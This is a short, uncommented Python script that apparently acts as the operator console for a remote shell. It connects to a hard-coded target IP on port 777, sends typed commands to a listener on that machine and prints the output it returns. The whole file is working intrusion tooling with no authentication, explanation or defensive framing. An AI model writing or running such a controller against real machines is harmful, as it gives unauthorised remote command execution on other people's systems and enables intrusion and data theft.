import os
import socket

TARGET = "192.168.2.63"

TARGET_PORT = 777

cwd = "cd"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((TARGET, TARGET_PORT))
while True:
    s.sendall(cwd.encode())

    current_dir = s.recv(8000).decode().strip()

    command = input(current_dir + "> ")

    if command == "cls":
        os.system("cls")
    elif command == "exit":
        break
    else:
        s.send(command.encode())

        output = s.recv(8000)
        print("\n", output.decode())
